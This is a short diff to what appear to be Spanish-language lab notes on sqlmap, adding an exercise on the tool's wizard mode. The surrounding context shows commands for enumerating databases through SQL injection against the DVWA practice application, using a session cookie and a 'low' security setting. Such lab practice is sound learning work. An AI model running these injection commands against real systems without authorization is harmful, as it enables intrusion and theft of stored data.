@@ -51,6 +51,14 @@
 --- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner --current-db ---> (Nos muestra la base de datos actual: dvwa)
 --- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner --current-db --dbs ---> (Nos muestra todas las bases de datos disponibles)
 
+++ Ejercicio_6 (Usar el wizard)
+--- sqlmap --wizard
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --wizard --batch
+--- Enter
+--- Enter
+--- Enter
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --wizard --batch ---> (Si no se desean especificar las opciones personalizadas)
+
 
 
 
